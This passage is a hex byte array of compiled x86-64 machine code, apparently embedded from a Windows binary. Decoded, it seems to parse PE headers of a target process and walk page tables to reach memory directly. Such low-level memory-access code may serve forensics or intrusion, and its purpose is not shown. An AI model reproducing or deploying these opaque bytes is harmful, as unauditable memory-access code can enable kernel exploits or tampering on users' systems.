    0x24, 0x40, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xF1, 0x48, 0x8D, 0x54, 0x24, 0x40,
    0x45, 0x31, 0xC9, 0xE8, 0xC8, 0x19, 0x00, 0x00, 0x85, 0xC0, 0x0F, 0x88, 0x58, 0x01, 0x00, 0x00,
    0x48, 0x8B, 0x05, 0x61, 0x7E, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x40, 0x48, 0xC1, 0xE9, 0x0C,
    0x48, 0xBA, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x48, 0x21, 0xD1, 0x48, 0x8D, 0x0C,
    0x49, 0x48, 0xC1, 0xE1, 0x04, 0x48, 0x03, 0x08, 0xBA, 0x03, 0x00, 0x00, 0x00, 0xFF, 0x15, 0xF5,
    0x7B, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xD7, 0x01, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0xE8,
    0x1C, 0x0F, 0x00, 0x00, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x9D, 0x6D, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0xDD, 0x68, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xA5, 0x70, 0x00, 0x00, 0x4D, 0x89,
    0xE1, 0xFF, 0x15, 0xA1, 0x7D, 0x00, 0x00, 0x4C, 0x8B, 0x64, 0x24, 0x40, 0x48, 0xB8, 0x00, 0xF0,
    0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x49, 0x21, 0xC4, 0x0F, 0x84, 0xC5, 0x01, 0x00, 0x00, 0x48,
    0xC1, 0xE3, 0x0C, 0x48, 0x21, 0xC3, 0x48, 0x83, 0xCB, 0x07, 0x48, 0x89, 0x9C, 0x24, 0x90, 0x00,
    0x00, 0x00, 0x41, 0xC1, 0xED, 0x09, 0x41, 0x81, 0xE5, 0xF8, 0x0F, 0x00, 0x00, 0x4D, 0x09, 0xEC,
    0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE1, 0x48, 0x8D, 0x94, 0x24, 0x90, 0x00, 0x00,
    0x00, 0x45, 0x31, 0xC9, 0xE8, 0x07, 0x19, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0xE8, 0x9F, 0x0E, 0x00,
    0x00, 0x48, 0x8D, 0x0D, 0x27, 0x3C, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x65, 0x68, 0x00, 0x00, 0x4C,
    0x8D, 0x05, 0x7A, 0x4E, 0x00, 0x00, 0x4D, 0x89, 0xE1, 0xFF, 0x15, 0x29, 0x7D, 0x00, 0x00, 0x4C,
    0x8B, 0x74, 0x24, 0x58, 0x49, 0x39, 0xF6, 0x0F, 0x85, 0x9B, 0xF9, 0xFF, 0xFF, 0x48, 0x8B, 0x44,
    0x24, 0x68, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x11, 0x51, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x21, 0x68, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x44, 0x4E, 0x00, 0x00, 0x4D, 0x89, 0xF1, 0xFF,
    0x15, 0xF3, 0x7C, 0x00, 0x00, 0x31, 0xED, 0xE9, 0x28, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xBC,
    0x5A, 0x00, 0x00, 0xE9, 0xB4, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x35, 0xE0, 0x5A, 0x00, 0x00, 0xEB,
    0x07, 0x48, 0x8D, 0x35, 0xFE, 0x5A, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x4C, 0x89, 0xE1,
    0xE9, 0x8E, 0x00, 0x00, 0x00, 0xBD, 0x41, 0x01, 0x00, 0xC0, 0xE9, 0xF5, 0x00, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0x89, 0x5A, 0x00, 0x00, 0xEB, 0x3E, 0x48, 0x8D, 0x0D, 0x4D, 0x42, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0xC8, 0x67, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x96, 0x6F, 0x00, 0x00, 0x4D, 0x89, 0xF1,
    0xE9, 0xC9, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x35, 0x93, 0x5A, 0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D,
    0x35, 0xB1, 0x5A, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0xFF, 0x15, 0x35,
    0x7A, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x8D, 0x15, 0x91, 0x67, 0x00, 0x00, 0x4C, 0x8D, 0x05,
    0x97, 0x4E, 0x00, 0x00, 0xFF, 0x15, 0x5E, 0x7C, 0x00, 0x00, 0xBD, 0x41, 0x01, 0x00, 0xC0, 0xE9,
    0x90, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x4C, 0x24, 0x50, 0xEB, 0x5D, 0x48, 0x8D, 0x35, 0x4D, 0x5A,
    0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D, 0x35, 0x6B, 0x5A, 0x00, 0x00, 0xBA, 0x00, 0x10, 0x00, 0x00,
    0x4C, 0x89, 0xF1, 0xFF, 0x15, 0xEF, 0x79, 0x00, 0x00, 0x48, 0x89, 0xF1, 0x48, 0x8D, 0x15, 0x4B,
    0x67, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x51, 0x4E, 0x00, 0x00, 0xFF, 0x15, 0x18, 0x7C, 0x00, 0x00,
    0xEB, 0x52, 0x48, 0x8D, 0x0D, 0xB3, 0x41, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x2E, 0x67, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0xFC, 0x6E, 0x00, 0x00, 0x4D, 0x89, 0xE1, 0xEB, 0x32, 0x4C, 0x8B, 0x4C, 0x24,
    0x48, 0xEB, 0x05, 0x4C, 0x8B, 0x4C, 0x24, 0x40, 0x49, 0xC1, 0xE9, 0x0C, 0x48, 0xB8, 0xFF, 0xFF,
    0xFF, 0xFF, 0x0F, 0x00, 0x00, 0x00, 0x49, 0x21, 0xC1, 0x48, 0x8D, 0x0D, 0x1D, 0x42, 0x00, 0x00,
    0x48, 0x8D, 0x15, 0xF7, 0x66, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xC5, 0x6E, 0x00, 0x00, 0xFF, 0x15,
    0xC4, 0x7B, 0x00, 0x00, 0x89, 0xE8, 0x48, 0x81, 0xC4, 0x98, 0x00, 0x00, 0x00, 0x5B, 0x5D, 0x5F,
    0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0xC8,
    0x05, 0x00, 0x00, 0x4C, 0x89, 0xC7, 0x89, 0xD6, 0x48, 0x81, 0xC7, 0xFF, 0x0F, 0x00, 0x00, 0x48,
    0x89, 0xFB, 0x48, 0x81, 0xE3, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0xC1, 0xEF, 0x0C, 0x48, 0x89, 0x7C,
    0x24, 0x20, 0x48, 0x8D, 0x0D, 0xBE, 0x53, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x94, 0x66, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0xCA, 0x54, 0x00, 0x00, 0x49, 0x89, 0xD9, 0xFF, 0x15, 0x58, 0x7B, 0x00, 0x00,
    0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x89, 0xF1, 0x48, 0x8D, 0x54, 0x24, 0x30,
    0xFF, 0x15, 0x0A, 0x7A, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x23, 0x48, 0x8D, 0x0D, 0xCC, 0x49, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0x56, 0x66, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x92, 0x54, 0x00, 0x00, 0xFF,
    0x15, 0x23, 0x7B, 0x00, 0x00, 0x45, 0x31, 0xFF, 0xE9, 0xC1, 0x05, 0x00, 0x00, 0x48, 0x8B, 0x74,
    0x24, 0x30, 0x48, 0x85, 0xF6, 0x74, 0x2E, 0x48, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x26,
    0x52, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x2F, 0x66, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xDB, 0x56, 0x00,
    0x00, 0x4C, 0x8D, 0x0D, 0x05, 0x66, 0x00, 0x00, 0xFF, 0x15, 0xEA, 0x7A, 0x00, 0x00, 0x48, 0x8B,
    0x4C, 0x24, 0x30, 0xEB, 0x02, 0x31, 0xC9, 0xE8, 0x14, 0x19, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F,
    0x84, 0xA5, 0x01, 0x00, 0x00, 0x49, 0x89, 0xC6, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xFF, 0x15, 0xC5,
    0x79, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x9A, 0x01, 0x00, 0x00, 0x49, 0x89, 0xC7, 0x48,
    0x8B, 0x4C, 0x24, 0x30, 0x4C, 0x8D, 0x84, 0x24, 0xE0, 0x02, 0x00, 0x00, 0x41, 0xB9, 0xE8, 0x02,
    0x00, 0x00, 0x48, 0x89, 0xC2, 0xE8, 0xF6, 0x18, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x2C, 0x39, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0xBC, 0x65, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xF2, 0x53, 0x00, 0x00, 0x4D,
    0x89, 0xF9, 0xFF, 0x15, 0x80, 0x7A, 0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0xF8, 0x02, 0x00, 0x00,
    0x48, 0x8B, 0x4C, 0x24, 0x30, 0x4C, 0x8D, 0x84, 0x24, 0xC8, 0x00, 0x00, 0x00, 0x41, 0xB9, 0x48,
    0x00, 0x00, 0x00, 0xE8, 0xB8, 0x18, 0x00, 0x00, 0x48, 0x8B, 0x94, 0x24, 0xE8, 0x00, 0x00, 0x00,
    0x48, 0x83, 0xC2, 0xF0, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x4C, 0x8D, 0x84, 0x24, 0x18, 0x02, 0x00,
    0x00, 0x41, 0xB9, 0xC8, 0x00, 0x00, 0x00, 0xE8, 0x94, 0x18, 0x00, 0x00, 0x4C, 0x8B, 0xA4, 0x24,
    0x48, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x4C, 0x8D, 0x84, 0x24, 0x88, 0x00, 0x00,
    0x00, 0x41, 0xB9, 0x40, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE2, 0xE8, 0x71, 0x18, 0x00, 0x00, 0x0F,
    0xB7, 0x84, 0x24, 0x88, 0x00, 0x00, 0x00, 0x3D, 0x4D, 0x5A, 0x00, 0x00, 0x0F, 0x85, 0xF0, 0x00,
    0x00, 0x00, 0x48, 0x63, 0x94, 0x24, 0xC4, 0x00, 0x00, 0x00, 0x4C, 0x01, 0xE2, 0x48, 0x8B, 0x4C,
    0x24, 0x30, 0x4C, 0x8D, 0x84, 0x24, 0x10, 0x01, 0x00, 0x00, 0x41, 0xB9, 0x08, 0x01, 0x00, 0x00,
    0xE8, 0x3B, 0x18, 0x00, 0x00, 0x81, 0xBC, 0x24, 0x10, 0x01, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00,
    0x0F, 0x85, 0xC8, 0x00, 0x00, 0x00, 0x66, 0x83, 0xBC, 0x24, 0x16, 0x01, 0x00, 0x00, 0x00, 0x0F,
    0x84, 0x89, 0x00, 0x00, 0x00, 0x0F, 0xB7, 0x84, 0x24, 0x24, 0x01, 0x00, 0x00, 0x48, 0x63, 0x8C,
    0x24, 0xC4, 0x00, 0x00, 0x00, 0x4C, 0x01, 0xE1, 0x4C, 0x8D, 0x3C, 0x08, 0x49, 0x83, 0xC7, 0x18,
    0x31, 0xED, 0x4C, 0x8D, 0x6C, 0x24, 0x60, 0x66, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x8B, 0x4C, 0x24, 0x30, 0x41, 0xB9, 0x28, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xFA, 0x4D, 0x89,
    0xE8, 0xE8, 0xDA, 0x17, 0x00, 0x00, 0x41, 0xB8, 0x05, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE9, 0x48,
    0x8D, 0x15, 0xEA, 0x44, 0x00, 0x00, 0xFF, 0x15, 0x84, 0x79, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x6A,
    0x41, 0xB8, 0x04, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE9, 0x48, 0x8D, 0x15, 0xDF, 0x64, 0x00, 0x00,
    0xFF, 0x15, 0x6A, 0x79, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x50, 0x48, 0xFF, 0xC5, 0x0F, 0xB7, 0x84,
    0x24, 0x16, 0x01, 0x00, 0x00, 0x49, 0x83, 0xC7, 0x28, 0x48, 0x39, 0xC5, 0x72, 0xA2, 0x48, 0x8D,
    0x0D, 0x6E, 0x56, 0x00, 0x00, 0xE9, 0x88, 0x03, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xAE, 0x55, 0x00,
    0x00, 0xE9, 0x7C, 0x03, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x61, 0x47, 0x00, 0x00, 0xE9, 0x70, 0x03,
    0x00, 0x00, 0x48, 0x8D, 0x0D, 0xF9, 0x55, 0x00, 0x00, 0xE9, 0x64, 0x03, 0x00, 0x00, 0x48, 0x8D,
    0x0D, 0xC5, 0x55, 0x00, 0x00, 0xE9, 0x58, 0x03, 0x00, 0x00, 0x8B, 0x6C, 0x24, 0x68, 0x44, 0x8B,
    0x7C, 0x24, 0x6C, 0x4D, 0x01, 0xE7, 0x49, 0x8D, 0x04, 0x2F, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48,
    0x8D, 0x0D, 0x80, 0x40, 0x00, 0x00, 0x4C, 0x8D, 0x25, 0x07, 0x64, 0x00, 0x00, 0x4C, 0x8D, 0x2D,
    0x3D, 0x52, 0x00, 0x00, 0x4C, 0x89, 0xE2, 0x4D, 0x89, 0xE8, 0x4D, 0x89, 0xF9, 0xFF, 0x15, 0xC5,
    0x78, 0x00, 0x00, 0x4C, 0x01, 0xFD, 0x48, 0x81, 0xC5, 0xFF, 0x0F, 0x00, 0x00, 0x49, 0x81, 0xE7,
    0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x81, 0xE5, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x89, 0x6C, 0x24, 0x20,
    0x48, 0x8D, 0x0D, 0x72, 0x40, 0x00, 0x00, 0x4C, 0x89, 0xE2, 0x4D, 0x89, 0xE8, 0x4D, 0x89, 0xF9,
    0xFF, 0x15, 0x92, 0x78, 0x00, 0x00, 0x49, 0x39, 0xEF, 0x0F, 0x83, 0xDC, 0x02, 0x00, 0x00, 0x49,
    0xBD, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x48, 0x85, 0xDB, 0x0F, 0x95, 0x44, 0x24,
    0x2F, 0x4C, 0x8D, 0x64, 0x24, 0x60, 0xEB, 0x28, 0x4D, 0x89, 0xFC, 0x4D, 0x89, 0xE7, 0x4C, 0x8D,
    0x64, 0x24, 0x60, 0x66, 0x66, 0x66, 0x66, 0x2E, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x49, 0x81, 0xC7, 0x00, 0x10, 0x00, 0x00, 0x49, 0x39, 0xEF, 0x0F, 0x83, 0x9B, 0x02, 0x00, 0x00,
    0x48, 0xC7, 0x44, 0x24, 0x60, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xF9, 0x48, 0xC1, 0xE9, 0x24,
    0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x4C, 0x01, 0xF1, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4C,
    0x89, 0xE2, 0x45, 0x31, 0xC9, 0xE8, 0xA6, 0x12, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x60, 0xA8,
    0x01, 0x74, 0xBD, 0x48, 0xC7, 0x44, 0x24, 0x48, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x21, 0xE8, 0x4C,
    0x89, 0xF9, 0x48, 0xC1, 0xE9, 0x1B, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x09, 0xC1, 0x41,
    0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x48, 0x45, 0x31, 0xC9, 0xE8, 0x6E, 0x12,
    0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x48, 0xA8, 0x01, 0x74, 0x85, 0x48, 0xC7, 0x44, 0x24, 0x40,
    0x00, 0x00, 0x00, 0x00, 0x4C, 0x21, 0xE8, 0x44, 0x89, 0xF9, 0xC1, 0xE9, 0x12, 0x81, 0xE1, 0xF8,
    0x0F, 0x00, 0x00, 0x48, 0x09, 0xC1, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24,
    0x40, 0x45, 0x31, 0xC9, 0xE8, 0x37, 0x12, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x40, 0xA8, 0x01,
    0x0F, 0x84, 0x4A, 0xFF, 0xFF, 0xFF, 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00, 0x4C,
    0x21, 0xE8, 0x44, 0x89, 0xF9, 0xC1, 0xE9, 0x09, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x09,
    0xC1, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x38, 0x45, 0x31, 0xC9, 0xE8,
    0xFC, 0x11, 0x00, 0x00, 0x4C, 0x85, 0x6C, 0x24, 0x38, 0x0F, 0x85, 0xF9, 0xFE, 0xFF, 0xFF, 0x4D,
    0x89, 0xFC, 0x48, 0x85, 0xDB, 0x0F, 0x84, 0x3D, 0x01, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00,
    0x0F, 0xB6, 0x4C, 0x24, 0x2F, 0x49, 0x39, 0xEF, 0x0F, 0x83, 0x31, 0x01, 0x00, 0x00, 0x48, 0x89,
    0x6C, 0x24, 0x50, 0x4C, 0x89, 0xFD, 0x48, 0xC1, 0xED, 0x09, 0x45, 0x31, 0xC0, 0x4C, 0x89, 0x44,
    0x24, 0x58, 0x4F, 0x8D, 0x24, 0x07, 0x4C, 0x89, 0xE1, 0x48, 0xC1, 0xE9, 0x24, 0x81, 0xE1, 0xF8,
    0x0F, 0x00, 0x00, 0x4C, 0x01, 0xF1, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24,
    0x60, 0x45, 0x31, 0xC9, 0xE8, 0x97, 0x11, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x60, 0xA8, 0x01,
    0x49, 0xBD, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x0F, 0x84, 0xCE, 0x00, 0x00, 0x00,
    0x4C, 0x21, 0xE8, 0x4C, 0x89, 0xE1, 0x48, 0xC1, 0xE9, 0x1B, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00,
    0x48, 0x09, 0xC1, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x48, 0x45, 0x31,
    0xC9, 0xE8, 0x5A, 0x11, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x48, 0xA8, 0x01, 0x0F, 0x84, 0x9B,
    0x00, 0x00, 0x00, 0x4C, 0x21, 0xE8, 0x44, 0x89, 0xE1, 0xC1, 0xE9, 0x12, 0x81, 0xE1, 0xF8, 0x0F,
    0x00, 0x00, 0x48, 0x09, 0xC1, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x40,
    0x45, 0x31, 0xC9, 0xE8, 0x28, 0x11, 0x00, 0x00, 0x48, 0x8B, 0x44, 0x24, 0x40, 0xA8, 0x01, 0x74,
    0x6D, 0x4C, 0x21, 0xE8, 0x89, 0xE9, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x09, 0xC1, 0x41,
    0xB8, 0x08, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x54, 0x24, 0x38, 0x45, 0x31, 0xC9, 0xE8, 0xFE, 0x10,
    0x00, 0x00, 0x4C, 0x85, 0x6C, 0x24, 0x38, 0x75, 0x45, 0x48, 0x8B, 0x54, 0x24, 0x58, 0x48, 0x8D,
    0x82, 0x00, 0x10, 0x00, 0x00, 0x48, 0x39, 0xD8, 0x0F, 0x92, 0xC1, 0x73, 0x1C, 0x4C, 0x01, 0xFA,
    0x48, 0x81, 0xC2, 0x00, 0x10, 0x00, 0x00, 0x48, 0x83, 0xC5, 0x08, 0x49, 0x89, 0xC0, 0x48, 0x3B,
    0x54, 0x24, 0x50, 0x0F, 0x82, 0x04, 0xFF, 0xFF, 0xFF, 0x4D, 0x8D, 0x24, 0x07, 0x48, 0x8B, 0x6C,
    0x24, 0x50, 0x49, 0xBD, 0x00, 0xF0, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0xEB, 0x11, 0x48, 0x8B,
    0x6C, 0x24, 0x50, 0xE9, 0xB3, 0xFD, 0xFF, 0xFF, 0x31, 0xC0, 0x0F, 0xB6, 0x4C, 0x24, 0x2F, 0x84,
    0xC9, 0x0F, 0x85, 0xA4, 0xFD, 0xFF, 0xFF, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x82,
    0x35, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x1C, 0x61, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x60, 0x4F, 0x00,
    0x00, 0x4D, 0x89, 0xF9, 0xFF, 0x15, 0xEE, 0x75, 0x00, 0x00, 0x4D, 0x85, 0xFF, 0x74, 0x3C, 0x48,
    0x8D, 0x0D, 0x89, 0x39, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x07, 0x61, 0x00, 0x00, 0x4C, 0x8D, 0x05,
    0x3D, 0x4F, 0x00, 0x00, 0x4D, 0x89, 0xF9, 0xFF, 0x15, 0xCB, 0x75, 0x00, 0x00, 0x4C, 0x89, 0xF1,
    0x4C, 0x89, 0xFA, 0x49, 0x89, 0xF8, 0x45, 0x31, 0xC9, 0xE8, 0x92, 0xF1, 0xFF, 0xFF, 0x85, 0xC0,
    0x79, 0x27, 0x48, 0x8D, 0x0D, 0x09, 0x47, 0x00, 0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0x44, 0x4E,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0xC5, 0x60, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x01, 0x4F, 0x00, 0x00,
    0xFF, 0x15, 0x92, 0x75, 0x00, 0x00, 0x45, 0x31, 0xFF, 0x48, 0x85, 0xF6, 0x74, 0x30, 0x48, 0x89,
    0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x69, 0x4C, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xA8, 0x60, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x53, 0x51, 0x00, 0x00, 0x4C, 0x8D, 0x0D, 0x7E, 0x60, 0x00, 0x00, 0xFF,
    0x15, 0x63, 0x75, 0x00, 0x00, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x72, 0x74, 0x00, 0x00, 0x4C, 0x89,
    0xF8, 0x48, 0x81, 0xC4, 0xC8, 0x05, 0x00, 0x00, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D,
    0x41, 0x5E, 0x41, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x81, 0xEC, 0x48,
    0x04, 0x00, 0x00, 0x4C, 0x89, 0xC7, 0x89, 0xD6, 0x48, 0x81, 0xC7, 0xFF, 0x0F, 0x00, 0x00, 0x48,
    0x89, 0xFB, 0x48, 0x81, 0xE3, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0xC1, 0xEF, 0x0C, 0x48, 0x89, 0x7C,
    0x24, 0x20, 0x48, 0x8D, 0x0D, 0xC7, 0x66, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x24, 0x60, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0xB0, 0x45, 0x00, 0x00, 0x49, 0x89, 0xD9, 0xFF, 0x15, 0xE8, 0x74, 0x00, 0x00,
    0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00, 0x89, 0xF1, 0x48, 0x8D, 0x54, 0x24, 0x30,
    0xFF, 0x15, 0x9A, 0x73, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x23, 0x48, 0x8D, 0x0D, 0x5C, 0x43, 0x00,
    0x00, 0x48, 0x8D, 0x15, 0xE6, 0x5F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x78, 0x45, 0x00, 0x00, 0xFF,
    0x15, 0xB3, 0x74, 0x00, 0x00, 0x45, 0x31, 0xED, 0xE9, 0x10, 0x02, 0x00, 0x00, 0x4C, 0x8B, 0x74,
    0x24, 0x30, 0x4D, 0x85, 0xF6, 0x74, 0x2E, 0x4C, 0x89, 0x74, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0xB6,
    0x4B, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xBF, 0x5F, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x6B, 0x50, 0x00,
    0x00, 0x4C, 0x8D, 0x0D, 0x95, 0x5F, 0x00, 0x00, 0xFF, 0x15, 0x7A, 0x74, 0x00, 0x00, 0x48, 0x8B,
    0x4C, 0x24, 0x30, 0xEB, 0x02, 0x31, 0xC9, 0xE8, 0xA4, 0x12, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F,
    0x84, 0x6C, 0x01, 0x00, 0x00, 0x49, 0x89, 0xC7, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0xFF, 0x15, 0x55,
    0x73, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x5E, 0x01, 0x00, 0x00, 0x48, 0x89, 0xC6, 0x48,
    0x89, 0x5C, 0x24, 0x48, 0x4C, 0x89, 0x7C, 0x24, 0x40, 0x4C, 0x89, 0x74, 0x24, 0x38, 0x48, 0x8B,
    0x4C, 0x24, 0x30, 0x4C, 0x8D, 0x84, 0x24, 0x60, 0x01, 0x00, 0x00, 0x41, 0xB9, 0xE8, 0x02, 0x00,
    0x00, 0x48, 0x89, 0xC2, 0xE8, 0x77, 0x12, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0xAD, 0x32, 0x00, 0x00,
    0x48, 0x8D, 0x2D, 0x3D, 0x5F, 0x00, 0x00, 0x48, 0x8D, 0x1D, 0xC9, 0x44, 0x00, 0x00, 0x48, 0x89,
    0xEA, 0x49, 0x89, 0xD8, 0x49, 0x89, 0xF1, 0xFF, 0x15, 0xFB, 0x73, 0x00, 0x00, 0x48, 0x8B, 0x94,
    0x24, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x4C, 0x8D, 0x84, 0x24, 0x18, 0x01,
    0x00, 0x00, 0x41, 0xB9, 0x48, 0x00, 0x00, 0x00, 0xE8, 0x33, 0x12, 0x00, 0x00, 0x45, 0x31, 0xF6,
    0x4C, 0x8B, 0xBC, 0x24, 0x38, 0x01, 0x00, 0x00, 0x45, 0x31, 0xED, 0x4C, 0x89, 0xFA, 0xEB, 0x14,
    0x44, 0x89, 0xEE, 0x48, 0x8B, 0x54, 0x24, 0x60, 0x41, 0x89, 0xF5, 0x4C, 0x39, 0xFA, 0x0F, 0x84,
    0xAA, 0x01, 0x00, 0x00, 0x48, 0x83, 0xC2, 0xF0, 0x48, 0x8B, 0x4C, 0x24, 0x30, 0x41, 0xB9, 0xC8,
    0x00, 0x00, 0x00, 0x4C, 0x8D, 0x44, 0x24, 0x50, 0xE8, 0xF3, 0x11, 0x00, 0x00, 0x4C, 0x8B, 0xA4,
    0x24, 0x80, 0x00, 0x00, 0x00, 0x4D, 0x85, 0xE4, 0x74, 0xC6, 0xF6, 0x84, 0x24, 0xB8, 0x00, 0x00,
    0x00, 0x04, 0x74, 0xBC, 0x8B, 0x84, 0x24, 0x90, 0x00, 0x00, 0x00, 0x41, 0x8D, 0x75, 0x01, 0x89,
    0x44, 0x24, 0x28, 0x4C, 0x89, 0x64, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x64, 0x38, 0x00, 0x00, 0x48,
